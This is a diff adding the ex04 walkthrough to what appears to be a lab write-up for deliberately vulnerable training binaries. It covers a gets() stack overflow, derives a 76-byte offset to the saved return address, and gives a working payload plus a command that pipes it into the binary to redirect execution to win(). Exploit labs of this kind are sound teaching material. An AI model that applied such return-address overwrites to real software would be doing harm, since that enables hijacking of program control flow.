@@ -291,8 +291,55 @@ is as sensitive as the return address. `%08x` here even echoes our overwritten p
 
 ---
 
-<!-- ex04 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex04 … ex11: in progress._
+### ex04 — overwrite the saved return address
+
+**Goal (`README.txt`):** see *“code flow successfully changed”*.
+
+**Vulnerability class:** classic stack buffer overflow overwriting the **saved return address** (CWE-121 → EIP control).
+
+**Disassembly:**
+
+```asm
+080483f4 <win>: ... puts("code flow successfully changed")
+
+08048408 <main>:
+ 804840e: sub    esp,0x50
+ 8048411: lea    eax,[esp+0x10]     ; &buffer
+ 8048418: call   gets@plt           ; gets(buffer)   <-- unbounded
+ 804841d: leave                     ; esp = ebp ; pop ebp
+ 804841e: ret                       ; pops saved EIP  <-- our target
+```
+
+**Reading it:** there's no `modified` variable and no function pointer this time —
+`main` just reads into `buffer` and returns. The only code pointer we can corrupt is
+`main`'s own **saved return address**, popped by `ret`. Overwrite it with `&win`.
+
+**Offset = 76 bytes.** `buffer` is at `esp+0x10`; the saved return address is at
+`[ebp+4]`. Because of the 16-byte stack alignment (`and esp,0xfffffff0`) the gap works out
+to 76. I confirmed it dynamically rather than trusting arithmetic: a 4-byte marker placed at
+offset 76 appears verbatim in the instruction pointer — the kernel fault log shows
+`ip 0000000042424242` when the marker is `0x42424242`.
+
+**Exploit (`scripts/ex04.py`):** `"A"*76 + p32(0x080483f4)`.
+
+```bash
+python3 scripts/ex04.py | /opt/hole-in-bin/ex04/bin
+```
+
+**Result (verified):** `code flow successfully changed`.
+> Note: when stdout is a **pipe** it is block-buffered, so `win()` prints into the buffer but
+> the crash on `win`'s own `ret` (returning to leftover bytes) can discard the unflushed line.
+> On a terminal — i.e. in the VM — it is line-buffered and prints immediately. Verified locally
+> by attaching a PTY (`script`), which shows `code flow successfully changed`.
+
+**Key takeaway:** the saved return address is the canonical overflow target. Finding the exact
+offset is the crux — derive it from the frame, then **confirm it dynamically** (GDB `pattern`, or
+reading the faulting EIP) because stack alignment makes the arithmetic environment-dependent.
+
+---
+
+<!-- ex05 … ex11 walkthroughs are added as each challenge is completed. -->
+_ex05 … ex11: in progress._
 
 ---
 
